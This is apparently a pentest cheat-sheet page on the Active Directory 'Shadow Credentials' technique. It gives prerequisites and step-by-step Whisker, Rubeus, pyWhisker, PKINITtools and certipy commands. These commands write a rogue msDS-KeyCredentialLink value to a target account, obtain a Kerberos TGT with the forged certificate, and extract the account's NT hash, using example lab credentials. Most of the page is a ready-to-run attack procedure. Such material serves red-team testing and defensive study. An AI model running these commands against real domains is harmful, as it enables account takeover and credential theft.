# Shadow Credentials

## Pre-requisites

For this technique to work, it is necessary to have the ability to write the attribute `msDS-KeyCredentialLink` on a target user or computer, and the environment must be set up as follows:

1. The target Domain must have at least one Domain Controller running Windows Server 2016 or above.
2. The Domain Functional Level should be Windows Server 2016 or above.
3. The Domain Controller to be used during the attack must have its certificate and keys. This means the organization must have AD CS, PKI, CA, or something similar.

As mentioned by [ShutdownRepo](https://github.com/ShutdownRepo/pywhisker), Pre-reqs 1 and 2 must be met because the PKINIT features were introduced with Windows Server 2016. Pre-req 3 is necessary because the DC requires its own certificate and keys for the session key exchange during the AS_REQ <-> AS_REP transaction. If Pre-req 3 is not met, a `KRB-ERROR (16): KDC_ERR_PADATA_TYPE_NOSUPP` will be raised.

## From Windows

To abuse Shadow Credentials from Windows, we will use [Whisker](https://github.com/eladshamir/Whisker).

```powershell
# Read value of msDS-KeyCredentialLink attribute of the target
.\Whisker.exe list /target:gabriel

# Generate certificate and print the rubeus command needed to retrieve the account's TGT and NTLM hash
.\Whisker.exe add /target:gabriel

# Run rubeus to get the TGT and NTLM hash
.\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap
```

## From Linux

We will use [pyWhisker](https://github.com/ShutdownRepo/pywhisker) to abuse the Shadow Credentials from Linux, a Python equivalent of the original `Whisker`. It is based on `Impacket` and a Python equivalent of [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) called [PyDSInternals](https://github.com/p0dalirius/pydsinternals). Using this tool along with [Dirk-jan's PKINITtools](https://github.com/dirkjanm/PKINITtools) enables complete exploitation from a UNIX-based systems.

```bash
# Enumerate current msDS-KeyCredentialLink values
pywhisker -d lab.local -u jeffry -p Music001 -t gabriel -a list

# Add our malicious msDS-KeyCredentialLink value
pywhisker -d lab.local -u jeffry -p Music001 -t gabriel -a add
```

The output provides us with three essential things: the `KeyCredential DeviceID,` the name of the certificate (in this case, `BX4EWk8m.pfx`), and the certificate's password `KQAx5lHP3h9TtzNly2Us`.

```bash
# Request TGT as Gabriel (PKINITtools)
gettgtpkinit -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache

# Extract Gabriel's NT hash
KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel

# Remove our malicious msDS-KeyCredentialLink value
pywhisker -d lab.local -u jeffry -p Music001 -t gabriel -a remove -D 643db54c-4507-6fc0-1801-3ca6c9604602
```

We can also use certipy which performs every step for us.

```bash
certipy shadow auto -u $USER@$DOMAIN -p '$PASSWD' -account $TARGET_USER
certipy shadow auto -k -target $TARGET -account $TARGET_USER
```
